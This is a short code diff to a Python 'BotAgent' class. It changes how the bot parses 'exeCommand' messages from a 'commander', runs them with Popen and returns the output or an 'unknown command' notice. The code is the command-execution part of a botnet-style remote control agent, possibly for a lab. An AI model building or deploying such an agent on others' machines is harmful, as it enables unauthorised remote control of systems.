@@ -141,7 +141,9 @@ class BotAgent:
                 print("Bot-agent {} received botHelloReply from commander".format(self.hostname))
                 self.last_online = time.time()
             case "exeCommand":
-                response = self.__execute_command(data.decode("utf-8"))
+                cmd = json_msg.get("command")
+                print("Bot-agent {} received exeCommand - {} from commander".format(self.hostname, cmd))
+                response = self.__execute_command(cmd)
                 if response:
                     payload = self.__build_json_payload("exeCommandReply", optional=(data.decode("utf-8"),
                                                                                      response.decode("utf-8")))
@@ -222,9 +224,10 @@ class BotAgent:
                   "process it and just move on. Error: {}".format(self.hostname, err))
             return
         if not self.__which(command):
-            print("The command {} that commander has sent to bot-agent {} is unknown. Will not process it and just "
-                  "move on.".format(command, self.hostname))
-            return
+            msg = "The command {} that commander has sent to bot-agent {} is unknown. Will not process it and just " \
+                  "move on.".format(command, self.hostname)
+            print(msg)
+            return msg.encode("utf-8")
         p = Popen(popen_payload, stderr=PIPE, stdout=PIPE)
         try:
             out, err = p.communicate(timeout=15)
